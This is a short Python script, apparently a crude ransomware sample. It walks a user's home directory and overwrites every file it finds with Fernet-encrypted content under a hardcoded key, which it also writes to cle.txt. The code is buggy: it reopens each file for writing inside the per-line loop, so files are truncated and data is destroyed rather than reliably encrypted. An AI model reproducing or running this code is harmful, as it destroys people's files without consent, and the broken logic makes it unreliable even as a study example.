import os
from cryptography.fernet import Fernet

os.chdir('/home/jhonson/')

os.system('find > calm.txt')

x = open('calm.txt', 'r')
for xx in x :
        xa = xx.strip()
        xv = str(os.path.isfile(xa))
        car = xa+' '+xv
        if 'True' in car :
                caca = car.split()
                ca = str(caca[0])
                dada = open(ca, 'r')
                for xd in dada :
                        xxd = xd
                        
                        f = Fernet('RHokRnjynEGXSv5VmPNkj-BCaoHnRv2Piznl7t4shgM=')
                        token = f.encrypt(xd)
                        file =open(ca,'w')
                        file.write(token) 
                      
                        
                        
                        
                        
                        cle = open('cle.txt', 'w')
                        cle.write('RHokRnjynEGXSv5VmPNkj-BCaoHnRv2Piznl7t4shgM=')
